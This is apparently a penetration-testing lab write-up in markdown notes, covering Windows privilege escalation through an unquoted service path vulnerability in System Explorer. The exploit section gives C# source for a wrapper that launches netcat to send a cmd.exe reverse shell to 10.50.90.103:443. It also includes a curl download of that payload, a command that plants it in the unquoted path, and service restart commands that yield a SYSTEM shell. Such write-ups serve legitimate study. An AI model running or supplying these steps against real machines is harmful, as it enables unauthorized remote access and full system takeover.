## Enumeration 

whoami/priv
![[Screenshot 2021-05-01 at 2.37.33 PM.png]]

whoami/groups
![[Screenshot 2021-05-01 at 2.37.51 PM.png]]

`wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"`

![[Screenshot 2021-05-01 at 2.45.30 PM.png]]


checking the access, and we have full access it a case of Unquoted service path vulnerabilities 
`powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"`

![[Screenshot 2021-05-01 at 2.53.34 PM.png]]

## Exploit 

we will write a small executable that executes a system command: activating netcat and sending us a reverse shell as the owner of the service (i.e. local system).

install `sudo apt install mono-devel`

Wrapper.cs

```cs
using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
            //Our code will go here!
			Process proc = new Process();
			ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-sp00f.exe", "10.50.90.103 443 -e cmd.exe");
			procInfo.CreateNoWindow = true;
			proc.StartInfo = procInfo;
			proc.Start();
        }
    }
}

```

and compile using `mcs Wrapper.cs`

![[Screenshot 2021-05-01 at 3.08.47 PM.png]]

upload the Wrapper.exe to `%TEMP%`

`curl http://10.50.90.103/Wrapper.exe -o %TEMP%\wrapper-sp00f.exe`

`cd C:\Users\Thomas\AppData\Local\Temp\`

`wrapper-sp00f.exe`

and we got the shell as thomas, go the user level access
![[Screenshot 2021-05-01 at 3.28.32 PM.png]]

![[Screenshot 2021-05-01 at 3.29.07 PM.png]]

### exploiting Unquoted service path vulnerabilities

here we are exploiting the vulnerability in the unquoted path of `C:\Program Files (x86)\System Explorer'` 

so we are going to place the binary to the `C:\Program Files (x86)\System Explorer\` as there only we are having the write permissions 

we will use the same wrapper, the one which we used to get the user Thomas

```powershell
copy %TEMP%\wrapper-sp00f.exe "C:\Program Files (x86)\System Explorer\System.exe"
```

and we have it

![[Screenshot 2021-05-01 at 5.02.28 PM.png]]

so to trigger it we have to restart the service and listen on the port

`sc stop SystemExplorerHelpService`
`sc start SystemExplorerHelpService`

![[Screenshot 2021-05-01 at 5.04.18 PM.png]]

and we got root i.e. `nt authority`
![[Screenshot 2021-05-01 at 5.04.30 PM.png]]

